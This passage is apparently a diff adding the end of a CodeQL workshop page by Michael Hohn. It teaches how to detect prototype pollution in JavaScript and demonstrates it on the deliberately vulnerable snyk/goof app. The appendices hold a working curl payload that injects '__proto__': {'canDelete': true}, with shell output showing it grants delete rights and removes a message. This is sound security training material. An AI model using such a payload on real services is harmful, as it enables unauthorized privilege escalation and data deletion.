+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#functions">functions overview </a> and the <a href="https://help.semmle.com/qldoc/javascript/semmle/javascript/Functions.qll/type.Functions$Function.html">Function</a> reference
+<ul class="org-ul">
+<li>FunctionDeclStmt (a subclass of Stmt)</li>
+<li><b>FunctionExpr</b> (a subclass of Expr)</li>
+<li>ArrowFunctionExpr (also a subclass of Expr)</li>
+</ul></li>
+<li>ClassDefinition,
+<ul class="org-ul">
+<li>ClassDeclStmt (which is a subclass of Stmt)</li>
+<li>ClassExpr (which is a subclass of Expr)</li>
+</ul></li>
+<li>MemberDefinition
+<ul class="org-ul">
+<li>MethodDefinition</li>
+<li>FieldDefinition</li>
+</ul></li>
+<li>DeclStmt</li>
+<li>BindingPattern
+<ul class="org-ul">
+<li>VarRef</li>
+<li>Parameter</li>
+<li>ArrayPattern</li>
+<li>ObjectPattern</li>
+</ul></li>
+<li>Property: Properties in object literals.  Is also a subclass of ASTNode,
+but neither of Expr nor of Stmt.</li>
+<li>Module
+<ul class="org-ul">
+<li>ES2015Module</li>
+<li>NodeModule</li>
+<li>AMDModule</li>
+</ul></li>
+<li>Scope
+<ul class="org-ul">
+<li>GlobalScope</li>
+<li>FunctionScope</li>
+<li>CatchScope</li>
+</ul></li>
+<li>Variable 
+<ul class="org-ul">
+<li>VarDecl</li>
+<li>VarAccess</li>
+</ul></li>
+</ul></li>
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#control-flow">Control Flow Graph</a>
+<ul class="org-ul">
+<li>ControlFlowNode</li>
+</ul></li>
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#data-flow">Data Flow</a>
+<ul class="org-ul">
+<li>definition and use
+<ul class="org-ul">
+<li>VarDef</li>
+<li>VarUse</li>
+</ul></li>
+<li>ssa</li>
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#data-flow-nodes">data flow nodes</a>
+<ul class="org-ul">
+<li><b>DataFlow::Node</b>
+<ul class="org-ul">
+<li>ValueNode
+<ul class="org-ul">
+<li><i>To <code>ValueNode</code></i>: use <code>DataFlow::valueNode</code> to convert an
+expression, function or class into its corresponding ValueNode</li>
+<li><i>From <code>ValueNode</code></i>: use <code>ValueNode.getAstNode()</code> for mapping from
+ValueNodes to ASTNodes</li>
+</ul></li>
+
+<li>SsaDefinitionNode
+<ul class="org-ul">
+<li><i>To <code>SsaDefinitionNode</code></i>, use <code>DataFlow::ssaDefinitionNode</code> to map
+an SSA definition to its corresponding SsaDefinitionNode.</li>
+<li><i>To <code>SsaDefinitionNode</code> for a parameter:</i> the auxiliary predicate
+<code>DataFlow::parameterNode</code> maps a parameter to its
+corresponding data flow node.</li>
+<li><i>From <code>SsaDefinitionNode</code>:</i> use
+<code>SsaDefinitionNode.getSsaVariable()</code> to get the <code>SsaVariable</code></li>
+</ul></li>
+</ul></li>
+
+<li>Use <code>DataFlow::Node.getAPredecessor()</code> to find other data flow nodes
+from which values may flow into this node, and <b><code>getASuccessor()</code></b> for the
+other direction.</li>
+</ul></li>
+
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#type-inference">Type inference</a></li>
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#call-graph">Call Graph</a></li>
+<li>inter-procedural
+<ul class="org-ul">
+<li>DataFlow::Configuration</li>
+<li>TaintTracking::Configuration</li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+
+
+<div id="outline-container-org3f71a9f" class="outline-3">
+<h3 id="org3f71a9f"><span class="section-number-3">5.5</span> CodeQL JS data flow library documentation</h3>
+<div class="outline-text-3" id="text-5-5">
+<p>
+Following are links and short descriptions of the dataflow concepts this
+workshop touches on.  Follow the links for a more in-depth description.
+</p>
+
+<ul class="org-ul">
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#analyzing-data-flow-in-javascript-and-typescript">analyzing-data-flow-in-javascript-and-typescript</a>
+<ul class="org-ul">
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#local-data-flow"><b>local data flow</b></a> Use the member predicates <code>getAPredecessor()</code> and
+<code>getASuccessor()</code> on DataFlow::Node.  To follow one or more steps of local
+data flow, use the transitive closure operator <code>+</code>, and for zero or more
+steps the reflexive transitive closure operator <code>*</code>.</li>
+
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#global-data-flow"><b>global-data-flow</b></a> global data flow is less precise than local data
+flow. That is, the analysis may report spurious flows that cannot in fact
+happen. Moreover, global data flow analysis typically requires
+significantly more time and memory than local analysis.</li>
+</ul></li>
+</ul>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org28af9d8" class="outline-2">
+<h2 id="org28af9d8"><span class="section-number-2">6</span> Appendices</h2>
+<div class="outline-text-2" id="text-6">
+</div>
+<div id="outline-container-org93e9eec" class="outline-3">
+<h3 id="org93e9eec"><span class="section-number-3">6.1</span> Appendix A: Trace the exploit in the VS Code JS Debugger</h3>
+<div class="outline-text-3" id="text-6-1">
+<p>
+To see the prototype injection exploit in action using the JS debugger, try the
+following steps:
+</p>
+<ul class="org-ul">
+<li><p>
+set up shell
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #483d8b;">.</span> ~/local/goof/exploits/prototype-pollution.sh
+<span style="color: #b22222;"># </span><span style="color: #b22222;">Gain permissions with c3</span>
+<span style="color: #b22222;"># </span><span style="color: #b22222;">Delete message with c4</span>
+</pre>
+</div></li>
+<li><p>
+Launch for debugging:
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #483d8b;">cd</span> ~/local/goof
+<span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">$</span> &amp;&amp; node --inspect=$<span style="color: #a0522d;">$</span> app.js
+</pre>
+</div></li>
+<li>In vs code, run 'attach to node process', choose the <code>node --inspect...</code>
+process.</li>
+<li>Set breakpoints in files, ~/local/goof/routes/index.js line 272</li>
+<li><p>
+From the shell, send the delete request.  It will fail to delete: 
+</p>
+<pre class="example">
+c4
+
+</pre></li>
+<li><p>
+Run the gain permission exploit, this will trap at breakpoint:
+</p>
+<pre class="example">
+c3
+
+</pre></li>
+<li><p>
+In vs code debug console, observe the value of
+</p>
+<pre class="example">
+({}).__proto__.canDelete
+
+</pre>
+<p>
+before and after the
+</p>
+<pre class="example">
+_.merge(message, req.body.message, {...})
+
+</pre>
+<p>
+expression.
+</p></li>
+</ul>
+
+<p>
+Oddly, there is different behavior in node command line:
+</p>
+<div class="org-src-container">
+<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">Different behavior in node command line?</span>
+cd ~/local/goof
+node
+Welcome to Node.js v14.13.1.
+Type <span style="color: #8b2252;">".help"</span> <span style="color: #a020f0;">for</span> more information.
+<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">_</span> = require(<span style="color: #8b2252;">'lodash'</span>);
+<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">a</span> = {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"a"</span>}
+<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">b</span> = {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"b"</span>}
+({}).__proto__.canDelete        <span style="color: #b22222;">// </span><span style="color: #b22222;">undefined</span>
+_.merge(a, { <span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"&#128520;"</span>, <span style="color: #8b2252;">"__proto__"</span>: {<span style="color: #8b2252;">"canDelete"</span>: <span style="color: #008b8b;">true</span>}}, b)
+a.canDelete                     <span style="color: #b22222;">// </span><span style="color: #b22222;">true</span>
+b.canDelete                     <span style="color: #b22222;">// </span><span style="color: #b22222;">undefined</span>
+({}).__proto__.canDelete        <span style="color: #b22222;">// </span><span style="color: #b22222;">undefined</span>
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgc3c7b89" class="outline-3">
+<h3 id="orgc3c7b89"><span class="section-number-3">6.2</span> Appendix B: Run default queries</h3>
+<div class="outline-text-3" id="text-6-2">
+<p>
+It's always worthwhile to try the default queries. 
+The CWE-400 <a href="https://github.com/Semmle/ql/blob/c9e22ab2716b29514435c9691776a73cbb3fe4a5/javascript/ql/test/query-tests/Security/CWE-400/src-vulnerable-lodash/tst.js#L1">tst.js</a> has this vulnerability, but it's not found in the test
+code by the queries
+</p>
+
+<ul class="org-ul">
+<li><a href="https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollution.ql#L21">Security/CWE-400/PrototypePollution.ql</a>
+Recursively merging a user-controlled object into another object
+can allow an attacker to modify the built-in Object prototype.</li>
+
+<li><a href="https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollutionUtility.ql#L14">Security/CWE-400/PrototypePollutionUtility.ql</a>
+Recursively assigning properties on objects may cause accidental
+modification of a built-in prototype object.</li>
+</ul>
+
+<p>
+without some additions as done in <a href="#org1b0a38d">Appendix C: Expand existing query with new sources and sinks</a>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org1b0a38d" class="outline-3">
+<h3 id="org1b0a38d"><span class="section-number-3">6.3</span> Appendix C: Expand existing query with new sources and sinks</h3>
+<div class="outline-text-3" id="text-6-3">
+<p>
+The original query found in <a href="./PrototypePollution-0.ql">./PrototypePollution-0.ql</a> can be enhanced without
+changing library code by subclassing as is done in <a href="./PrototypePollution-1.ql">./PrototypePollution-1.ql</a>.
+</p>
+
+<p>
+This finds a good set of results, including the local query's results found
+earlier.
+</p>
+
+<p>
+The results reported by CodeQL:
+</p>
+<ul class="org-ul">
+<li><p>
+Prototype pollution caused by merging a user-controlled value from here using a
+vulnerable version of lodash.  index.js:272:22
+</p>
+
+<p>
+Path
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-right" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="org-right">1</td>
+<td class="org-left">req</td>
+<td class="org-left">index.js:259:7</td>
+</tr>
+
+<tr>
+<td class="org-right">2</td>
+<td class="org-left">req</td>
+<td class="org-left">index.js:272:22</td>
+</tr>
+
+<tr>
+<td class="org-right">3</td>
+<td class="org-left">req.body</td>
+<td class="org-left">index.js:272:22</td>
+</tr>
+
+<tr>
+<td class="org-right">4</td>
+<td class="org-left">req.body.message</td>
+<td class="org-left">index.js:272:22</td>
+</tr>
+</tbody>
+</table></li>
+
+<li><p>
+Prototype pollution caused by merging a user-controlled value from here using a
+vulnerable version of just-a-test .  index.js:272:22
+</p>
+
+<p>
+Path
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-right" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="org-right">1</td>
+<td class="org-left">req</td>
+<td class="org-left">index.js:259:7</td>
+</tr>
+
+<tr>
+<td class="org-right">2</td>
+<td class="org-left">req</td>
+<td class="org-left">index.js:272:22</td>
+</tr>
+
+<tr>
+<td class="org-right">3</td>
+<td class="org-left">req.body</td>
+<td class="org-left">index.js:272:22</td>
+</tr>
+
+<tr>
+<td class="org-right">4</td>
+<td class="org-left">req.body.message</td>
+<td class="org-left">index.js:272:22</td>
+</tr>
+</tbody>
+</table></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org7d429ea" class="outline-3">
+<h3 id="org7d429ea"><span class="section-number-3">6.4</span> Appendix D: Further Reading</h3>
+<div class="outline-text-3" id="text-6-4">
+<p>
+The queries provided by the ql library include the following.  They use 
+flow labels and some other advanced concepts that we won't cover during this
+workshop.  They are recommended for separate reading.
+</p>
+
+<ul class="org-ul">
+<li><a href="https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollution.ql#L21">Security/CWE-400/PrototypePollution.ql</a></li>
+<li><a href="https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollutionUtility.ql#L14">Security/CWE-400/PrototypePollutionUtility.ql</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org4721eb6" class="outline-3">
+<h3 id="org4721eb6"><span class="section-number-3">6.5</span> Appendix E: Complete Setup and Exploit of the snyk/goof Application</h3>
+<div class="outline-text-3" id="text-6-5">
+<p>
+This is a concise setup and run of <a href="https://github.com/snyk/goof">snyk/goof</a>.  All steps are included for
+completeness, but for the workshop we only need to collect the vulnerability
+information.
+</p>
+
+<ol class="org-ol">
+<li><p>
+Install <a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-os-x/#install-mongodb-community-edition">mongodb</a>
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Install</span>
+brew tap mongodb/brew
+brew install mongodb-community@4.4
+</pre>
+</div>
+<p>
+To have launchd start mongodb/brew/mongodb-community now and restart at login:
+</p>
+<pre class="example">
+brew services start mongodb/brew/mongodb-community
+
+</pre>
+<p>
+Or, if you don't want/need a background service you can just run:
+</p>
+<pre class="example">
+mongod --config /usr/local/etc/mongod.conf
+
+</pre>
+
+<p>
+Which is what we do:
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Run</span>
+mongod --config /usr/local/etc/mongod.conf &amp;
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">check log</span>
+tail /usr/local/var/log/mongodb/mongo.log
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">Connect and test</span>
+mongo
+
+<span style="color: #0000ff;">db.inventory.insertOne</span>(
+   { item: <span style="color: #8b2252;">"canvas"</span>, qty: 100, tags: [<span style="color: #8b2252;">"cotton"</span>], size: { h: 28, w: 35.5, uom: <span style="color: #8b2252;">"cm"</span> } }
+)
+
+<span style="color: #0000ff;">db.inventory.find</span>( { item: <span style="color: #8b2252;">"canvas"</span> } )
+</pre>
+</div></li>
+
+<li><p>
+Install goof
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Clone</span>
+<span style="color: #483d8b;">cd</span> ~/local
+git clone https://github.com/Snyk/goof
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">Build</span>
+<span style="color: #483d8b;">cd</span> ~/local/goof
+npm install
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">...</span>
+<span style="color: #b22222;"># </span><span style="color: #b22222;">found 253 vulnerabilities (153 low, 17 moderate, 82 high, 1 critical)</span>
+<span style="color: #b22222;">#   </span><span style="color: #b22222;">run `npm audit fix` to fix them, or `npm audit` for details</span>
+<span style="color: #b22222;"># </span><span style="color: #b22222;">...</span>
+</pre>
+</div></li>
+
+<li><p>
+Run goof
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Run mongodb</span>
+mongod --config /usr/local/etc/mongod.conf &amp;
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">Run goof</span>
+<span style="color: #483d8b;">cd</span> ~/local/goof
+npm start                       <span style="color: #b22222;"># </span><span style="color: #b22222;">follow logs here</span>
+<span style="color: #b22222;"># </span><span style="color: #b22222;">or</span>
+node app.js                     <span style="color: #b22222;"># </span><span style="color: #b22222;">from ~/local/goof/package.json</span>
+open http://localhost:3001
+</pre>
+</div></li>
+
+<li><p>
+Try prototype-pollution exploits
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Check exploits</span>
+bash
+<span style="color: #483d8b;">.</span> ~/local/goof/exploits/prototype-pollution.sh
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">Try c1 through c4 and exploit:</span>
+List messages
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c1
+        []
+
+Send some messages
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c2
+        {<span style="color: #8b2252;">"ok"</span>:true}
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c2
+        {<span style="color: #8b2252;">"ok"</span>:true}
+
+List again
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c1
+        [{<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:1,<span style="color: #8b2252;">"timestamp"</span>:1602276330967,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>},
+         {<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:2,<span style="color: #8b2252;">"timestamp"</span>:1602276331875,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>}]
+
+Try to delete
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c4
+        {<span style="color: #8b2252;">"ok"</span>:false,<span style="color: #8b2252;">"error"</span>:<span style="color: #8b2252;">"Access denied"</span>}
+
+Use exploit
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c3
+        {<span style="color: #8b2252;">"ok"</span>:true}
+
+Try to delete again
+        hohn@gh-hohn ~/local/goof/exploits
+        130:$ c4
+        {<span style="color: #8b2252;">"ok"</span>:true}
+
+Notice message 1 is gone:
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c1
+        [{<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:2,<span style="color: #8b2252;">"timestamp"</span>:1602276331875,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>},
+         {<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"&#128520;"</span>,<span style="color: #8b2252;">"id"</span>:3,<span style="color: #8b2252;">"timestamp"</span>:1602276340962,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>}]
+</pre>
+</div></li>
+
+<li><p>
+The exploit's origin, or "What happened?"
+</p>
+
+<p>
+The requests sent are
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">// c2, safe
+{
+    curl --request PUT <span style="color: #8b2252;">\</span>
+      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
+      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
+      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'</span>
+}
+// c3, the exploit:
+{
+    curl --request PUT <span style="color: #8b2252;">\</span>
+      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
+      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
+      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, </span>
+<span style="color: #8b2252;">               "message": { "text": "&#128520;", "__proto__": {"canDelete": true}}}'</span>
+}
+</pre>
+</div>
+
+<p>
+Both are PUT requests to the URL <code>$GOOF_HOST/chat</code>, but the json messages differ:
+</p>
+<div class="org-src-container">
+<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">safe</span>
+{<span style="color: #8b2252;">"auth"</span>: {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"user"</span>, <span style="color: #8b2252;">"password"</span>: <span style="color: #8b2252;">"pwd"</span>}, 
+ <span style="color: #8b2252;">"message"</span>: {<span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"Hi!"</span>}}
+
+<span style="color: #b22222;">// </span><span style="color: #b22222;">exploit</span>
+{<span style="color: #8b2252;">"auth"</span>: {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"user"</span>, <span style="color: #8b2252;">"password"</span>: <span style="color: #8b2252;">"pwd"</span>}, 
+ <span style="color: #8b2252;">"message"</span>: { <span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"&#128520;"</span>, <span style="color: #8b2252;">"__proto__"</span>: {<span style="color: #8b2252;">"canDelete"</span>: <span style="color: #008b8b;">true</span>}}}
+</pre>
+</div></li>
+</ol>
+
+
+
+
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="author">Author: Michael Hohn</p>
+<p class="date">Created: 2020-10-20 Tue 15:19</p>
+<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
+</div>
+</body>
+</html>
